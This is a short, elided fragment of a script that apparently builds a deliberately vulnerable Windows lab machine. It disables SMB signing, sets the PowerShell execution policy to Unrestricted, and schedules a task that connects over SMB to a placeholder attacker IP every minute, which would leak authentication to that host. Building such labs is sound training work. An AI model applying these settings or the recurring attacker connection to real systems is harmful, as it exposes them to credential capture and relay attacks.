...
# Enable outgoing SMB connections and disable SMB signing for these connections
echo "    Set-SmbClientConfiguration -RequireSecuritySignature `$false -Confirm:`$false" >> $installScriptPath # Outbound connections
...
# Add registered task for a SMB connection each minute
...
# Recurring SMB task
echo "Set-ExecutionPolicy Unrestricted -Force" >> $scheduledTaskPath
echo "net use \\${ud_attacker_ip}" >> $scheduledTaskPath
